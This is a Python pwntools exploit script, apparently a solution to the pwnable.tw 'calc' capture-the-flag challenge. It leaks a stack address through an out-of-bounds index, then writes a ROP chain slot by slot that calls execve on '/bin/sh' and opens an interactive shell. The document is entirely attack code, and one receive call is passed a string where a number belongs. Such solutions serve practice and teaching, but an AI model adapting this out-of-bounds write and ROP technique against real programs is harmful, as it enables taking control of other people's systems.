from pwn import *

offsets = ["+361", "+362", "+363", "+364", "+365",
           "+366", "+367", "+368", "+369"]
addresses = [0x0805c34b, 0xb, 0x080701d0, 0x0, 0x0,
             0x0, 0x08049a21, 0x6E69622F,0x0068732F]

program = process("./calc")
# program = remote("chall.pwnable.tw", 10100)

program.recv(1024)
program.sendline(b"+360")
prev_ebp = int(program.recv(1024))
addresses[5] = prev_ebp

for i in range(len(offsets)):
    print("[!] Target: %s" % offsets[i])
    program.sendline(offsets[i].encode())

    leak_address = int(program.recv("1024"))
    print("[!] Leak: %s" % hex(leak_address))
    
    offset = addresses[i] - leak_address
    print("[!] Offset: %s" % offset)

    payload = "%s%+d" % (offsets[i], offset)
    print("[+] Send payload: %s" % payload)

    program.sendline(payload.encode("utf-8"))
    res_address = int(program.recv(1024))
    print("======> %s\n===============" % hex(res_address))


program.sendline()
program.interactive()